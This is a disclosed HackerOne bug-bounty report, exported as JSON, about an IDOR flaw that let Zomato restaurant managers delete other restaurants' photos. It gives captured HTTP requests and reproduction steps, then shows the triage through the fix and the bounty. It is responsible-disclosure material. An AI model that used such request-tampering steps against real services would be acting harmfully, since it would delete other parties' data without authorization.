{"id":404797,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDQ3OTc=","url":"https://hackerone.com/reports/404797","title":"IDOR to delete images from other stores","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2018-09-03T16:42:10.715Z","submitted_at":"2018-09-03T16:42:10.715Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"emitrani","url":"/emitrani","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/206/181/54e8d7444534dbe32a21bd75c87febb777a18496_original.PNG/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2943,"url":"https://hackerone.com/zomato","handle":"zomato","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Zomato","twitter_handle":"Zomato","website":"https://www.zomato.com","about":"The fastest way to search for great places to eat at and order from around you. Serving 24 countries worldwide."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2018-09-05T17:01:23.798Z","bug_reporter_agreed_on_going_public_at":"2018-09-05T15:11:33.350Z","team_member_agreed_on_going_public_at":"2018-09-05T17:01:23.591Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:** The parameter `photo_ids` in below request is vulnerable to IDOR\n\n/php/client_manage_handler?‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà\u0026case=remove-active-photo\n\n**Description:** Since there is no check for res_id or ownership I was able to delete Gerben's image by just using the photo_id from his store. This is a problem because it is a get request and I can try a bunch of ID's to randomly delete photos that don't belong to me or try to find a way to leak this ID from store page to do targeted deletes. \n\nI believe if you try to delete multiple photos there will be more ids in the request so that would allow to expand the attack by trying a lot of ids at once.\n\n**Platform(s) Affected:** [website]\n\n\n## Steps To Reproduce:\n\n\n  1. Get 2 stores.\n  2. With store 1 navigate to https://www.zomato.com/clients/manage_photos.php\n  3. Start to delete a photo and capture the request that looks like :\n\n```\nGET /php/client_manage_handler?‚ñà‚ñà‚ñà\u0026case=remove-active-photo HTTP/1.1\nHost: www.zomato.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://www.zomato.com/\nX-Requested-With: XMLHttpRequest\nCookie: _ga=GA1.2.2082511252.1535917423; _gid=GA1.2.1587734047.1535917423; PHPSESSID=4821c7caf69f3253db3be3d4c42a15b7b04d223a; fbcity=283; zl=en; fbtrack=a09417c27b7e98b4b3f2ad8357ef3903; __utmx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:NaN; __utmxx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:1535944804:8035200; dpr=2; cto_lwid=82057293-9985-419b-a25b-4d8b6d89951b; G_ENABLED_IDPS=google; zhli=1; squeeze=cd186e1f53eee0d94e51ef00c9d4eb25; orange=2769113; al=1; session_id=null\nConnection: close\nX-Forwarded-For: 127.0.0.1\n\n```\n\n4 . Save the photo_ids parameter\n5 . Go to your second restaurant account and capture the same request with a different res_id and cookies\n6 . Replace the `photo_ids` with the id from step 4 and send request.\n7 . Observe the photo is deleted.\n\n## Impact\n\nBy using targeted or blind attacks it is possible to delete photos that don't belong to a restaurant because of this IDOR. My leading theory is that currently you are checking that the logged in user has permissions on the res_id in the request but not verifying that the res_id owns that photograph. There should be an additional check to ensure that the photo_id belongs to that restaurant before deleting it.\n\nRegards,\nEray","bounty_amount":"600.0","formatted_bounty":"$600","weakness":{"id":55,"name":"Insecure Direct Object Reference (IDOR)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":49,"voters":["libcontainer","sameerphad72","spam404","miguel_santareno","mik317","flashdisk","ali","emitrani","aryan2808","generaleg","and 39 more..."],"severity":{"rating":"low","author_type":"Team"},"structured_scope":{"databaseId":383,"asset_type":"URL","asset_identifier":"*.zomato.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":3286156,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"POC:\n\n{F341857}","automated_response":false,"created_at":"2018-09-03T16:45:24.790Z","updated_at":"2018-09-03T16:45:24.790Z","actor":{"username":"emitrani","cleared":true,"url":"/emitrani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/206/181/54e8d7444534dbe32a21bd75c87febb777a18496_original.PNG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":341857,"filename":"proof.JPG","type":"image/jpeg","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/341/857/b4979640c930d4180787b1963665149d0f361784/proof.JPG?response-content-disposition=attachment%3B%20filename%3D%22proof.JPG%22%3B%20filename%2A%3DUTF-8%27%27proof.JPG\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T145639Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=e12bf585dd858402ab6c7540564a0d0413a6eed3e538b469d4cb95de11841e1f"}],"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3286175,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @emitrani,\n\nThank you for your submission. We are investigating your report, and will let you know if we have any questions. We appreciate your assistance and cooperation.","automated_response":false,"created_at":"2018-09-03T16:54:54.956Z","updated_at":"2018-09-03T16:54:54.956Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3286176,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2018-09-03T16:55:04.079Z","updated_at":"2018-09-03T16:55:04.079Z","additional_data":{"old_severity":"Medium","new_severity":"Low","old_severity_id":204903,"new_severity_id":204912},"actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3286429,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @prateek_0490-zomato,\n\nI found a way to get the photo_id from restaurants to do targeted deleting of photos. I believe in light of this information you might reconsider the severity as only prerequisite to perform this attack becomes owning a restaurant manager account.\n\nIf you go to a restaurant page like https://www.zomato.com/washington-dc/old-ebbitt-grill-downtown and click `All photos` and intercept the request you will see the following:\n\n```\nPOST //php/photoviewerData.php HTTP/1.1\nHost: www.zomato.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://www.zomato.com/\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 384\nCookie: _ga=GA1.2.2082511252.1535917423; _gid=GA1.2.1587734047.1535917423; PHPSESSID=9989b21f95f2ab2f41f11ec304f6ac58f2c445f4; fbcity=283; zl=en; fbtrack=a09417c27b7e98b4b3f2ad8357ef3903; __utmx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:NaN; __utmxx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:1536001591:8035200; dpr=2; cto_lwid=82057293-9985-419b-a25b-4d8b6d89951b; G_ENABLED_IDPS=google; zhli=1; squeeze=427c02f9f422eb1ca8fd81723c912253; orange=4411464; al=1; session_id=null; csrf=cd01d3d66835a75f5588852cf26e26d4; ak_bmsc=311D3563BCBA40C5DE755ACA53DC87B4B81C11952E6F00000F868D5B7834CA25~pllXy4xKhsB6DdsDwY8KYOHpXwOkLLHZbn56SG9EI0T5FaEGmiI8C+T9b65LICM+C4OMSgfQfx+VnBdzdQ9Ik08Ns7GzhnXsFhBdcX+NAlaa1oEoH77wHYEa/XFNwmuoX4hH9gF30/pt9nGUvDWhqkplkpIgGNiPMQGMy/lJ3wwrngS6yPYpJbpcbpwPKDJRxrP50xMVVmBTkPWrLCLdWB8Izo3j3WTrfj4iLXHK7wMhM=; LEL_JS=true; bm_sv=3D12D8CA594927210BEA1A7E276CF8C2~ijgWzSmJx+1gIjjBTZB9Fb60dSMUdE+oQmtZ29nwYqRUFbO3Kz9+MMRSD4Iu5j7pZf5mB2Vq4uV7SPqLLUiGFqsujq2n5Oxbju2sGWmhTDjpWQ7x7sI6gOwI0FQr6BPh22qhaP/D+6+0fNutGhlxHr6lAro/aXJjqCoO9wMdH0c=; AMP_TOKEN=%24NOT_FOUND\nConnection: close\nX-Forwarded-For: 127.0.0.1\n\nphotoviewersize=NORMAL\u0026photo_id=u_1MDU1NjE2NzE5M\u0026type=res\u0026index=1\u0026category=all\u0026res_id=16872578\u0026group_id=false\u0026onPage=true\u0026moreToFetch%5B%5D=0\u0026moreToFetch%5B%5D=1\u0026moreToFetch%5B%5D=2\u0026moreToFetch%5B%5D=3\u0026moreToFetch%5B%5D=4\u0026moreToFetch%5B%5D=5\u0026moreToFetch%5B%5D=6\u0026moreToFetch%5B%5D=7\u0026moreToFetch%5B%5D=8\u0026moreToFetch%5B%5D=9\u0026moreToFetch%5B%5D=10\u0026moreToFetch%5B%5D=11\u0026moreToFetch%5B%5D=12\n```\n\nWhere `photo_id` parameter can be used to delete said photo. Might have to change the u_ to r_ but I'm not sure as I didn't try to delete a photo in production.\n\nRegards,\nEray ","automated_response":false,"created_at":"2018-09-03T19:11:17.089Z","updated_at":"2018-09-03T19:13:52.878Z","actor":{"username":"emitrani","cleared":true,"url":"/emitrani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/206/181/54e8d7444534dbe32a21bd75c87febb777a18496_original.PNG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3286511,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@emitrani One has to be a restaurant manager is itself a bit of task to perform this action. \n\nAre you able to delete User's Posted Images too? Like can you delete this?\n\n‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà\n\nThanks.","automated_response":false,"created_at":"2018-09-03T19:53:12.505Z","updated_at":"2018-09-05T16:59:29.993Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3286535,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I think I can only delete photos starting with r_ as in posted by restaurant but I'm not entirely sure. I got a success response back so it might take some time to be removed from s3. \n\nI checked I can only delete something with r_. I can show it with that photo\n\n‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà","automated_response":false,"created_at":"2018-09-03T20:05:13.902Z","updated_at":"2018-09-05T16:58:35.910Z","actor":{"username":"emitrani","cleared":true,"url":"/emitrani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/206/181/54e8d7444534dbe32a21bd75c87febb777a18496_original.PNG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3286543,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hence I set it as Low :) Thanks.","automated_response":false,"created_at":"2018-09-03T20:07:24.535Z","updated_at":"2018-09-03T20:07:24.535Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3287005,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I see makes sense. I thought being able to target would change severity but I see your point. I should also point out that I tried to delete user uploaded photo with a regular user but got an error saying I can only delete photos uploaded by me so that part is not vulnerable.\n\nThanks for the explanation.","automated_response":false,"created_at":"2018-09-03T23:32:43.546Z","updated_at":"2018-09-03T23:32:43.546Z","actor":{"username":"emitrani","cleared":true,"url":"/emitrani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/206/181/54e8d7444534dbe32a21bd75c87febb777a18496_original.PNG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3296291,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @emitrani - This has been fixed. Please check and confirm!\n\nThanks for helping us keep @zomato secure :) \n\nCheers.","automated_response":false,"created_at":"2018-09-05T10:39:49.459Z","updated_at":"2018-09-05T10:39:49.459Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"emitrani","url":"/emitrani"},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3296377,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the update @prateek_0490-zomato,\n\nIs there an image you want me to test this on? When I tried to delete the old picture I already deleted I got a `{\"status\":\"success\"}` response, however that might be because that picture no longer exists.\n\nI'm sure the fix is right but I have no way to confirm it properly.\n\nRegards,\nEray","automated_response":false,"created_at":"2018-09-05T11:17:50.569Z","updated_at":"2018-09-05T11:17:50.569Z","actor":{"username":"emitrani","cleared":true,"url":"/emitrani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/206/181/54e8d7444534dbe32a21bd75c87febb777a18496_original.PNG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3296379,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@emitrani - Can you try out on this image - `https://www.zomato.com/‚ñà‚ñà‚ñà‚ñà‚ñà`","automated_response":false,"created_at":"2018-09-05T11:19:58.030Z","updated_at":"2018-09-05T16:50:58.263Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3296402,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Oh Okay I see. I still get the `{\"status\":\"success\"}` response but the photo is no longer deleted.\n\nI confirm the fix but you might want to edit the response string with the new code path. \n\nRegards.\nEray","automated_response":false,"created_at":"2018-09-05T11:24:10.165Z","updated_at":"2018-09-05T11:24:10.165Z","actor":{"username":"emitrani","cleared":true,"url":"/emitrani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/206/181/54e8d7444534dbe32a21bd75c87febb777a18496_original.PNG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3297166,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"I think the POC is pretty funny and tried to summarize the report as best I can since Zomato prefers summary disclosure.\n\nFeel free to accept or deny it.\n\nRegards,\nEray","automated_response":false,"created_at":"2018-09-05T15:11:33.393Z","updated_at":"2018-09-05T15:11:33.393Z","first_to_agree":true,"actor":{"username":"emitrani","cleared":true,"url":"/emitrani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/206/181/54e8d7444534dbe32a21bd75c87febb777a18496_original.PNG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3297661,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2018-09-05T16:54:35.857Z","updated_at":"2018-09-05T16:54:35.857Z","actor":{"url":"/zomato","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Zomato"}},"bounty_amount":"300.0","bounty_currency":"usd","bonus_amount":"300.0","genius_execution_id":null,"team_handle":"zomato","collaborator":{"username":"emitrani","url":"/emitrani"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3297697,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2018-09-05T17:01:23.680Z","updated_at":"2018-09-05T17:01:23.680Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3297698,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2018-09-05T17:01:23.838Z","updated_at":"2018-09-05T17:01:23.838Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":10261,"category":"researcher","content":"When I was testing the restaurant manager specific endpoints on Zomato I discovered that pictures added were being deleted with a get request like so:\n\n```\nGET /php/client_manage_handler?res_id=REDACTED\u0026photo_ids%5B%5D=r_YxNDUOTE4MTYzO\u0026removable=1\u0026case=remove-active-photo HTTP/1.1\nHost: www.zomato.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://www.zomato.com/\nX-Requested-With: XMLHttpRequest\nCookie: REDACTED\nConnection: close\n```\n`photo_ids` seemed like a potential IDOR and I found it was possible to find the ID by visiting a restaurants front page. Since I didn't want to delete a photo in production I decided to contact someone who I knew also had access to a manager account to test my intuition. As I had no way of seeing if his private picture was deleted I waited for his response and then submitted my report with the following POC:\n\n{F341857}\n\n@Zomato team promptly verified and fixed the issue and it was a pleasure to work with them for the first time.\n","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":206181,"username":"emitrani","name":"Eray Mitrani","bio":"Just stumbling into critsüçÄ @ErayMitrani","cleared":true,"website":null,"location":"New York","created_at":"2017-10-07T01:13:32.261Z","url":"https://hackerone.com/emitrani","anc_triager":false,"hackerone_triager":false,"hackerone_employee":null,"user_type":"hacker","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/206/181/54e8d7444534dbe32a21bd75c87febb777a18496_original.PNG/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/206/181/54e8d7444534dbe32a21bd75c87febb777a18496_original.PNG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://profile-photos.hackerone-user-content.com/variants/000/206/181/54e8d7444534dbe32a21bd75c87febb777a18496_original.PNG/c11036e2d3f8b05af4b5da5984ccdec6f786b763c8abceb4e68042e10dcdae85"}}}]}